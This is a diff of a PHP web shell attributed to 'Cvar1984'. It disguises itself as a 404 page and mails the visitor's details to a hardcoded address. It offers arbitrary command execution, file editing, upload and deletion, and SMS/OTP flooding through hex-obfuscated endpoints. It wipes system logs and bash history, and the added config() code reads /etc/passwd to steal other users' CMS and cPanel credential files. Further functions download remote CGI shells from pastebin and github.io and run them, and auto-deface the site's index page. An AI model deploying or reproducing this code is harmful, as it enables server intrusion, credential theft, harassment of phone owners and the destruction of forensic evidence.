@@ -12,14 +12,15 @@
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
- * GNU General Public License for more details.
+ * GNU General Public License for more details.9
  *
  * You should have received a copy of the GNU General Public License
  * along with this program; if not, write to the Free Software
  * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
  * MA 02110-1301, USA.
  *
- */
+*/
+
 session_start();
 set_time_limit(0);
 ini_set('max_execution_time', 0);
@@ -28,16 +29,16 @@ ini_restore('safe_mode');
 
 $auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
 $email = "gedzsarjuncomuniti@gmail.com"; // Your Email
-
 if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
-		$sep = substr('\\', 0, 1);
-		$os = "Windows";
-	} else {
-		$sep = '/';
-		$os = "Linux";
+	$sep = substr('\\', 0, 1);
+	$os = "Windows";
+}
+else {
+	$sep = '/';
+	$os = "Linux";
 }
 
-if (! empty($_SERVER['HTTP_USER_AGENT'])) {
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	$userAgents = array(
 		"Googlebot",
 		"DuckDuckBot",
@@ -71,24 +72,23 @@ if (! empty($_SERVER['HTTP_USER_AGENT'])) {
 	}
 }
 
-function login_shell()
-{
-	?>
+function login_shell() {
+?>
 <title>404 Not Found</title>
 <h1>Not Found</h1>
-<p>The requested URL <?php echo $_SERVER['PHP_SELF'];?> was not found on this server.</p>
+<p>The requested URL <?php echo $_SERVER['PHP_SELF']; ?> was not found on this server.</p>
 <p>Additionally, a 404 Not Found
 error was encountered while trying to use an ErrorDocument to handle the request.</p>
 <?php
 	exit();
 }
-if (! isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
+if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
-		$_SESSION[md5(sha1($_SERVER['HTTP_HOST']))] = true;
-		$shell_path = 
-		$content_mail = "URL : http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\n\nIP : ".$_SERVER['REMOTE_ADDR']."\n\nPassword : ".$auth_pass."\n\nBy Cvar1984";
+		$_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ] = true;
+		$shell_path = $content_mail = "URL : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : " . $auth_pass . "\n\nBy Cvar1984";
 		@mail($email, "Logs", $content_mail, "From:Cvar1984");
-	} else {
+	}
+	else {
 		login_shell();
 	}
 }
@@ -184,10 +184,8 @@ if (! isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
 </head>
 <body>
 <?php
-
 // FUNCTION
-function post_data($url, $data)
-{
+function post_data($url, $data) {
 	$ch = curl_init($url);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
@@ -197,9 +195,8 @@ function post_data($url, $data)
 	curl_close($ch);
 }
 
-function get_data($url, $data)
-{
-	$ch = curl_init($url."?$data");
+function get_data($url, $data) {
+	$ch = curl_init($url . "?$data");
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -207,14 +204,42 @@ function get_data($url, $data)
 	curl_close($ch);
 }
 
-function home()
-{
+function home() {
 	echo "<script>window.location='?';</script>";
 }
 
-function spamsms()
-{
-	?>
+function hapus($dir) {
+	if (is_dir($dir)) {
+		$objects = scandir($dir);
+		foreach ($objects as $object) {
+			if ($object != "." && $object != "..") {
+				if (is_dir($dir . "/" . $object)) {
+					hapus($dir . "/" . $object);
+				}
+				else {
+					unlink($dir . "/" . $object);
+				}
+			}
+		}
+		if (rmdir($dir)) {
+			return true;
+		}
+		else {
+			return false;
+		}
+	}
+	else {
+		if (@unlink($dir)) {
+			return true;
+		}
+		else {
+			return false;
+		}
+	}
+}
+
+function spamsms() {
+?>
 <center>
 		<h2>Multi Spam SMS</h2>
 		<form method="post">
@@ -228,74 +253,140 @@ function spamsms()
 		$no = explode("\n", $_POST['no']);
 		$no = str_replace(' ', '', $no);
 		$no = str_replace("\n\n", "\n", $no);
-		foreach ($no as $on) :
+		foreach ($no as $on):
 			echo "<hr>Calling	 -> " . $on . "<hr>";
 			post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
-		endforeach
-		;
-		for ($x = 0; $x < 100; $x ++) {
-			foreach ($no as $on) :
+		endforeach;
+		for ($x = 0;$x < 100;$x++) {
+			foreach ($no as $on):
 				echo "<hr>Send OTP To -> " . $on . "<hr>";
 				post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
 				post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
-			endforeach
-			;
+			endforeach;
 		}
-	} else {
+	}
+	else {
 		die();
 	}
 	die();
 }
 
-function music()
-{
+function music() {
 	echo "<center>";
 	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
 	echo "</center>";
 	die();
 }
 
-function jumping()
-{
+function jumping() {
 	alert("This feature under developmen");
 }
 
-function config()
-{
-	alert("This feature under developmen");
-}
+function config() {
+	// grab config by indoXploit
+	global $dir;
+	if (!file_exists('.config')) {
+		mkdir(".config");
+	}
+	if (!file_exists('.config/config')) {
+		mkdir(".config/config");
+	}
+	$isi = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
+	if (!file_exists('.config/config/.htaccess')) {
+		file_put_contents('.config/config/.htaccess', $isi);
+	}
+	if (preg_match("/vhosts|vhost/", $dir)) {
+		$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+		if (!file_exists('.config/config/vhost.cin')) {
+			file_put_contents('.config/config/vhost.cin', gzinflate(urldecode(file_get_contents('https://cvar1984.github.io/vhost.cin'))));
+		}
 
-function mass_deface()
-{
-	alert("This feature under developmen");
-}
+		if (cmd("cd .config/config && ./vhost.cin")) {
+			echo "<center><a href='$link_config/.config/config'><font color=lime>Done</font></a></center>";
+		}
+		else {
+			echo "<center><a href='$link_config/.config/config/vhost.cin'><font color=lime>Done</font></a></center>";
+		}
 
-function info()
-{
-	if(!ini_get('disable_functions') == true) {
-		$dist="False";
-		} else {
-			$dist=ini_get('disable_functions');
+	}
+	else {
+		$etc = @fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
+		while ($passwd = fgets($etc)) {
+			if ($passwd == "" || !$etc) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
 			}
-	?>
-   <center><h5>Disabled Function : <?php echo $dist;?> </h5>
+			else {
+				preg_match_all('/(.*?):x:/', $passwd, $user_config);
+				foreach ($user_config[1] as $user_idx) {
+					$user_config_dir = "/home/$user_idx/public_html/";
+					if (is_readable($user_config_dir)) {
+						$grab_config = array(
+							"/home/$user_idx/.my.cnf" => "cpanel",
+							"/home/$user_idx/.accesshash" => "WHM-accesshash",
+							"$user_config_dir/po-content/config.php" => "Popoji",
+							"$user_config_dir/vdo_config.php" => "Voodoo",
+							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
+							"$user_config_dir/config/koneksi.php" => "Lokomedia",
+							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
+							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
+							"$user_config_dir/whm/configuration.php" => "WHMCS",
+							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
+							"$user_config_dir/forum/config.php" => "phpBB",
+							"$user_config_dir/sites/default/settings.php" => "Drupal",
+							"$user_config_dir/config/settings.inc.php" => "PrestaShop",
+							"$user_config_dir/app/etc/local.xml" => "Magento",
+							"$user_config_dir/joomla/configuration.php" => "Joomla",
+							"$user_config_dir/configuration.php" => "Joomla",
+							"$user_config_dir/wp/wp-config.php" => "WordPress",
+							"$user_config_dir/wordpress/wp-config.php" => "WordPress",
+							"$user_config_dir/wp-config.php" => "WordPress",
+							"$user_config_dir/admin/config.php" => "OpenCart",
+							"$user_config_dir/slconfig.php" => "Sitelok",
+							"$user_config_dir/application/config/database.php" => "Ellislab"
+						);
+						foreach ($grab_config as $config => $nama_config) {
+							$ambil_config = file_get_contents($config);
+							if ($ambil_config != '') {
+								$file_config = fopen(".config/config/$user_idx-$nama_config.txt", "w");
+								fputs($file_config, $ambil_config);
+							}
+						}
+					}
+				}
+			}
+		}
+		echo "<center><a href='?dir=$dir/.config/config'><font color=lime>Done</font></a></center>";
+	}
+}
+
+function mass_deface() {
+	alert("This feature under developmen");
+}
+
+function info() {
+	if (!ini_get('disable_functions') == true) {
+		$dist = "False";
+	}
+	else {
+		$dist = ini_get('disable_functions');
+	}
+?>
+   <center><h5>Disabled Function : <?php echo $dist; ?> </h5>
 		<textarea class="form-control" id="textarea" readonly /><?php
 	print_r($_SERVER);
-	?></textarea>
+?></textarea>
 	</center>
 	<?php
 	die();
 }
 
-function logout()
-{
-	unset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))]);
+function logout() {
+	unset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ]);
 	home();
 }
 
-function alert($message)
-{
-	?>
+function alert($message) {
+?>
 <script type="text/javascript">
 var ALERT_TITLE = "Alert";
 var ALERT_BUTTON_TEXT = "Ok";
@@ -543,26 +634,26 @@ code {
 	text-decoration: none;
 }
 </style>
-<script type="text/javascript">alert(<?php echo "'".$message."'";?>);</script>
+<script type="text/javascript">alert(<?php echo "'" . $message . "'"; ?>);</script>
 <?php
 }
 
-function edit($filename)
-{
+function edit($filename) {
 	if (isset($_POST['text'])) {
 		if (file_put_contents($filename, $_POST['text'])) {
 			alert("Sucess");
-		} else {
+		}
+		else {
 			alert("Permission Denied");
 		}
 	}
 	$text = file_get_contents($filename);
-	?>
+?>
 <form method="post">
 		<center>
-			<h5>Files Editor : <?php echo $filename;?></h5>
+			<h5>Files Editor : <?php echo $filename; ?></h5>
 			<textarea name="text" class="form-control" id="textarea" cols=""
-				rows=""><?php echo htmlspecialchars($text);?></textarea>
+				rows=""><?php echo htmlspecialchars($text); ?></textarea>
 			<br> <input type="submit" class="btn btn-danger" />
 		</center>
 	</form>
@@ -570,46 +661,46 @@ function edit($filename)
 	die();
 }
 
-function open($filename)
-{
+function open($filename) {
 	alert("this extension is not supported");
 	home();
 }
 
-function cmd($cmd)
-{
+function cmd($cmd) {
 	if (function_exists('system')) {
 		ob_start();
 		@system($cmd);
 		$buff = ob_get_contents();
 		ob_end_clean();
 		return $buff;
-	} elseif (function_exists('exec')) {
+	}
+	elseif (function_exists('exec')) {
 		@exec($cmd, $results);
 		$buff = "";
 		foreach ($results as $result) {
 			$buff .= $result;
 		}
 		return $buff;
-	} elseif (function_exists('passthru')) {
+	}
+	elseif (function_exists('passthru')) {
 		ob_start();
 		@passthru($cmd);
 		$buff = ob_get_contents();
 		ob_end_clean();
 		return $buff;
-	} elseif (function_exists('shell_exec')) {
+	}
+	elseif (function_exists('shell_exec')) {
 		$buff = @shell_exec($cmd);
 		return $buff;
 	}
 }
 
-function cmd_ui()
-{
+function cmd_ui() {
 	echo "<center><h2>Command Prompt</h2></center>";
 	if (isset($_POST['command'])) {
 		echo "<center><textarea id='textarea' class='form-control' readonly>" . cmd($_POST['command']) . "</textarea></center>";
 	}
-	?>
+?>
 <center>
 		<form method="post">
 			<input type="text" class='input-sm' id='input' name="command" /> <input
@@ -621,17 +712,17 @@ function cmd_ui()
 	die();
 }
 
-function renames($filename)
-{
+function renames($filename) {
 	if (isset($_POST['action'])) {
 		if (@rename($filename, $_POST['newname'])) {
 			alert("Success");
-		} else {
+		}
+		else {
 			alert("Permission Denied");
 		}
 		home();
 	}
-	?>
+?>
    <form method='post'>
 		<center>
 			<td>Filename : <input type='text' class='input-sm' id='input'
@@ -643,17 +734,17 @@ function renames($filename)
 	die();
 }
 
-function chmods($filename)
-{
+function chmods($filename) {
 	if (isset($_POST['action'])) {
 		if (chmod($filename, $_POST['permission'])) {
- 		alert("Success");
-		} else {
+			alert("Success");
+		}
+		else {
 			alert("Permission Denied");
 		}
 		home();
 	}
-	?>
+?>
    <form method='post'>
 		<center>
 			<td>Permission : <input type='text' class='input-sm' id='input'
@@ -665,78 +756,78 @@ function chmods($filename)
 	die();
 }
 
-function clear_logs()
-{
-	global $os;
-	if($os == 'Linux') {
-		@unlink('/tmp/logs');
-		@unlink('/root/.ksh_history');
-		@unlink('/root/.bash_history');
-		@unlink('/root/.bash_logout');
-		@unlink('/usr/local/apache/logs');
-		@unlink('/usr/local/apache/log');
-		@unlink('/var/apache/logs');
-		@unlink('/var/apache/log');
-		@unlink('/var/run/utmp');
-		@unlink('/var/logs');
-		@unlink('/var/log');
-		@unlink('/var/adm');
-		@unlink('/etc/wtmp');
-		@unlink('/etc/utmp');
-		@unlink('/var/log/lastlog');
-		@unlink('/var/log/wtmp');
-		@unlink('.config');
-		@unlink('error_log');
+function clear_logs() {
+	global $os, $dir;
+	if ($os == 'Linux') {
+		@hapus('/tmp/logs');
+		@hapus('/root/.ksh_history');
+		@hapus('/root/.bash_history');
+		@hapus('/root/.bash_logout');
+		@hapus('/usr/local/apache/logs');
+		@hapus('/usr/local/apache/log');
+		@hapus('/var/apache/logs');
+		@hapus('/var/apache/log');
+		@hapus('/var/run/utmp');
+		@hapus('/var/logs');
+		@hapus('/var/log');
+		@hapus('/var/adm');
+		@hapus('/etc/wtmp');
+		@hapus('/etc/utmp');
+		@hapus('/var/log/lastlog');
+		@hapus('/var/log/wtmp');
+		@hapus('.config');
+		@hapus('error_log');
 		alert("Logs is clear");
-	} else {
+	}
+	else {
 		alert("This function not available for Windows server");
-		@unlink('.config');
+		@hapus('.config');
 	}
 }
 
-function cgi_shell()
-{
+function cgi_shell() {
 	global $os;
-	if($os == 'Windows') {
+	if ($os == 'Windows') {
 		alert("This function not available for Windows server");
-	} else {
-	if(!file_exists('.config')) {
-		mkdir('.config');
 	}
-	file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
-	file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
-	echo("<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>");
-	die();
+	else {
+		if (!file_exists('.config')) {
+			mkdir('.config');
+		}
+		file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
+		file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
+		echo ("<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>");
+		die();
 	}
-	
+
 }
 
-function ngindex()
-{
+function ngindex() {
 	if (isset($_POST['action'])) {
-		$file=file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');
-		$file=str_replace('<title>Hacked By Cvar1984</title>', '<title>'.$_POST['title'].'</title>',$file);
-		$file=str_replace('https://cvar1984.github.io/bg.mp3', $_POST['music'],$file);
-		$file=str_replace('Just Joke :v', $_POST['alert'],$file);
-		$file=str_replace('https://minervagunceleri.files.wordpress.com/2014/08/logo.png', $_POST['images'],$file);
-		$file=str_replace('<h1>Hacked By Cvar1984</h1>', '<h1>'.$_POST['content'].'</h1>',$file);
-		$file=str_replace('<h4>This Pain Is Wonderful</h4>', '<h4>'.$_POST['sub_content'].'</h4>',$file);
+		$file = file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');
+		$file = str_replace('<title>Hacked By Cvar1984</title>', '<title>' . $_POST['title'] . '</title>', $file);
+		$file = str_replace('https://cvar1984.github.io/bg.mp3', $_POST['music'], $file);
+		$file = str_replace('Just Joke :v', $_POST['alert'], $file);
+		$file = str_replace('https://minervagunceleri.files.wordpress.com/2014/08/logo.png', $_POST['images'], $file);
+		$file = str_replace('<h1>Hacked By Cvar1984</h1>', '<h1>' . $_POST['content'] . '</h1>', $file);
+		$file = str_replace('<h4>This Pain Is Wonderful</h4>', '<h4>' . $_POST['sub_content'] . '</h4>', $file);
 
-		if(file_exists('index.php')) {
+		if (file_exists('index.php')) {
 			rename('index.php', 'index.php.bak');
 			chmod('index.php.bak', '0444');
-			if(file_put_contents('index.php', $file)) {
+			if (file_put_contents('index.php', $file)) {
 				alert("index.php Defaced");
 			}
-		} elseif(file_exists('index.html')) {
+		}
+		elseif (file_exists('index.html')) {
 			rename('index.html', 'index.html.bak');
 			chmod('index.html.bak', '0444');
-			if(file_put_contents('index.html', $file)) {
+			if (file_put_contents('index.html', $file)) {
 				alert("index.html Defaced");
 			}
 		}
 	}
-	?>
+?>
 <center><h2>Auto Deface With Backup</h2></center>
 <form method='post'>
 	<table align="center">
@@ -770,30 +861,34 @@ function ngindex()
 	die();
 }
 
-function short_link()
-{
+function short_link() {
 	echo "<center><h2>Shortlink Generator</h2></center>";
 	if (isset($_POST['action'])) {
-		$param="https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyDKvTCsXX3Vipbqyhj3a0JH1D3JYMuB5VM";
+		$param = "https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyDKvTCsXX3Vipbqyhj3a0JH1D3JYMuB5VM";
 		$post = array(
-		"longUrl"=> $_POST['link']
-	);
+			"longUrl" => $_POST['link']
+		);
 
-$jsondata = json_encode($post);
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$param);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type:application/json"));
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
-$response=curl_exec($ch);
-curl_close($ch);
-$json=json_decode($response);
-if(isset($json->error)) {
-	echo $json->error->message;
-	} else {
-		echo "<center><textarea id='textarea' class='form-control' readonly>".$json->id."</textarea></center>";
+		$jsondata = json_encode($post);
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, $param);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_HEADER, 0);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+			"Content-type:application/json"
+		));
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
+		$response = curl_exec($ch);
+		curl_close($ch);
+		$json = json_decode($response);
+		if (isset($json->error)) {
+			echo $json
+				->error->message;
+		}
+		else {
+			echo "<center><textarea id='textarea' class='form-control' readonly>" . $json->id . "</textarea></center>";
 		}
 	}
 
@@ -814,10 +909,11 @@ if(isset($json->error)) {
 	</center>
 </form>
 <?php
-die();
+	die();
 }
 
 // END FUNCTION
+
 ?>
 <nav class="navbar navbar-inverse">
 	<div class="container-fluid">
@@ -848,53 +944,74 @@ die();
 </nav><?php
 if (@$_GET['do'] == 'home') {
 	home();
-} elseif (@$_GET['do'] == 'sms') {
+}
+elseif (@$_GET['do'] == 'sms') {
 	spamsms();
-} elseif (@$_GET['do'] == 'music') {
+}
+elseif (@$_GET['do'] == 'music') {
 	music();
-} elseif (@$_GET['do'] == 'jumping') {
+}
+elseif (@$_GET['do'] == 'jumping') {
 	jumping();
-} elseif (@$_GET['do'] == 'config') {
+}
+elseif (@$_GET['do'] == 'config') {
 	config();
-} elseif (@$_GET['do'] == 'mass_deface') {
+}
+elseif (@$_GET['do'] == 'mass_deface') {
 	mass_deface();
-} elseif (@$_GET['do'] == 'info') {
+}
+elseif (@$_GET['do'] == 'info') {
 	info();
-} elseif (@$_GET['do'] == 'logout') {
+}
+elseif (@$_GET['do'] == 'logout') {
 	logout();
-} elseif (@$_GET['do'] == 'edit' and isset($_GET['files'])) {
+}
+elseif (@$_GET['do'] == 'edit' and isset($_GET['files'])) {
 	edit($_GET['files']);
-} elseif (@$_GET['do'] == 'open' and isset($_GET['dir'])) {
+}
+elseif (@$_GET['do'] == 'open' and isset($_GET['dir'])) {
 	$dir = $_GET['dir'];
 	chdir($dir);
-} elseif (@$_GET['do'] == 'view' and isset($_GET['files'])) {
+}
+elseif (@$_GET['do'] == 'view' and isset($_GET['files'])) {
 	open($_GET['files']);
-} elseif (@$_GET['do'] == 'delete' and isset($_GET['files'])) {
-	if (@unlink($_GET['files'])) {
+}
+elseif (@$_GET['do'] == 'delete' and isset($_GET['files'])) {
+	if (@hapus($_GET['files'])) {
 		alert("Success");
-	} else {
+	}
+	else {
 		alert("Permission Denied");
 	}
-} elseif (@$_GET['do'] == 'rename' and isset($_GET['files'])) {
+}
+elseif (@$_GET['do'] == 'rename' and isset($_GET['files'])) {
 	renames($_GET['files']);
-} elseif (@$_GET['do'] == 'chmod' and isset($_GET['files'])) {
+}
+elseif (@$_GET['do'] == 'chmod' and isset($_GET['files'])) {
 	chmods($_GET['files']);
-} elseif (@$_GET['do'] == 'cmd') {
+}
+elseif (@$_GET['do'] == 'cmd') {
 	cmd_ui();
-} elseif(@$_GET['do'] == 'logs') {
+}
+elseif (@$_GET['do'] == 'logs') {
 	clear_logs();
-} elseif(@$_GET['do'] == 'cgi') {
+}
+elseif (@$_GET['do'] == 'cgi') {
 	cgi_shell();
-} elseif(@$_GET['do'] == 'deface') {
+}
+elseif (@$_GET['do'] == 'deface') {
 	ngindex();
-} elseif(@$_GET['do'] == 'shortlink') {
+}
+elseif (@$_GET['do'] == 'shortlink') {
 	short_link();
-} elseif(@$_GET['do'] == 'new' and isset($_GET['dir'])) {
-	if(@mkdir($_GET['dir'].'/'.'new_dir')) {
+}
+elseif (@$_GET['do'] == 'new' and isset($_GET['dir'])) {
+	if (@mkdir($_GET['dir'] . '/' . 'new_dir')) {
 		alert("Success");
-	} else {
+	}
+	else {
 		alert("Permission Denied Or File Exists");
-	}	
+	}
 }
 
 $dir = scandir(getcwd());
@@ -902,8 +1019,8 @@ echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='b
 	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
 	<th style='background:green;float:right;width:300px;text-align:center;font-size:18px;'>Action</th>
 	</table>";
-foreach ($dir as $dir) :
-	?>
+foreach ($dir as $dir):
+?>
 <table width='70%' class='table-hover' align='center'>
 		<tr>
 	<?php
@@ -917,7 +1034,8 @@ foreach ($dir as $dir) :
 		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
 		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
-	} elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif' or $ext == 'rar' or $ext == 'zip' or $ext == 'doc' or $ext == 'pdf') {
+	}
+	elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif' or $ext == 'rar' or $ext == 'zip' or $ext == 'doc' or $ext == 'pdf') {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
@@ -925,7 +1043,8 @@ foreach ($dir as $dir) :
 		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
 		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
-	} else {
+	}
+	else {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
@@ -934,12 +1053,11 @@ foreach ($dir as $dir) :
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
 		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
-	?>
+?>
 	</tr>
 	</table>
 <?php
-endforeach
-;
+endforeach;
 ?>
 <table width='70%' cellpadding='3' cellspacing='3' align='center'
 		style='background: green;'>
@@ -954,7 +1072,8 @@ endforeach
 if (isset($_POST['upl'])) {
 	if (copy($_FILES['file']['tmp_name'], getcwd() . $sep . $_FILES['file']['name'])) {
 		alert("Upload Success");
-	} else {
+	}
+	else {
 		alert("Upload Failed");
 	}
 }
